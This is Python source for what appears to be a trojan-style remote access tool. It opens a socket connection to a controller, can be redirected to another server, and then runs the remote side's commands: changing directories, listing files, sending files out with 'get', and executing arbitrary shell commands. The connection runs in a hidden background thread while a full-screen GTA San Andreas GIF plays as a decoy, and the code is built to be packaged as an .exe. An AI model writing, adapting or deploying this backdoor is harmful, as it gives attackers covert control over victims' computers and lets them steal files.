import socket  
import os
import subprocess
import requests
import threading
import tkinter as tk
from PIL import Image, ImageTk
import sys

def connect_server():
    host = "127.0.0.1"
    if not host:
        print("Não foi possível obter o IP do servidor.")
        return
    port = 4444

    try:
        s = socket.socket()
        s.connect((host, port))
        server_ip_message = s.recv(1024).decode()

        if server_ip_message.startswith("SERVER_IP"):
            server_ip = server_ip_message.split()[1]
            s.close()
            s = socket.socket()
            s.connect((server_ip, port))

        while True:
            command = s.recv(1024).decode()
            if command.startswith("cd "):
                try:
                    path = command[3:]
                    os.chdir(path)
                    s.send(f"[OK] Current path: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(f"[ERROR ☠️] {e}".encode())
            elif command == 'ls':
                try:
                    files = "\n".join(os.listdir())
                    s.send(files.encode())
                except Exception as e:
                    s.send(f"[ERROR ☠️] {e}".encode())
            elif command.startswith("get "):
                archive_name = command[4:]
                if os.path.exists(archive_name):
                    with open(archive_name, "rb") as f:
                        data = f.read()
                        s.sendall(data)
                        s.send(b"<EOF>")
                else:
                    s.send(f"[ERROR ☠️] Arquivo não encontrado.")
            elif command.startswith("exec "):
                cmd = command[5:]
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(e.output)
            elif command == "exit":
                s.send(b"[!] Desconectando.")
                break
            else:
                s.send(b"[ERRO] Comando desconhecido.")
    except Exception as e:
        print("Erro ao conectar:", e)
    finally:
        s.close()
        print("[*] Conexão encerrada.")

def show_gif():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(background='black')

    # Caminho do GIF (para .exe ou script)
    if getattr(sys, 'frozen', False):
        base_dir = sys._MEIPASS
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    
    gif_path = os.path.join(base_dir, "gtasa.gif")

    try:
        image = Image.open(gif_path)
        frames = []
        for i in range(image.n_frames):
            image.seek(i)
            frame = ImageTk.PhotoImage(image.copy())
            frames.append(frame)

        label = tk.Label(root)
        label.pack()

        current_frame = 0
        def update_frame():
            nonlocal current_frame
            label.config(image=frames[current_frame])
            current_frame = (current_frame + 1) % len(frames)
            root.after(50, update_frame)  # Ajuste a velocidade aqui

        update_frame()
        root.mainloop()
    except Exception as e:
        print(f"Erro ao carregar o GIF: {e}")
        root.destroy()

if __name__ == "__main__":
    # Inicia a conexão em uma thread
    server_thread = threading.Thread(target=connect_server)
    server_thread.daemon = True
    server_thread.start()

    # Exibe o GIF em tela cheia
    show_gif()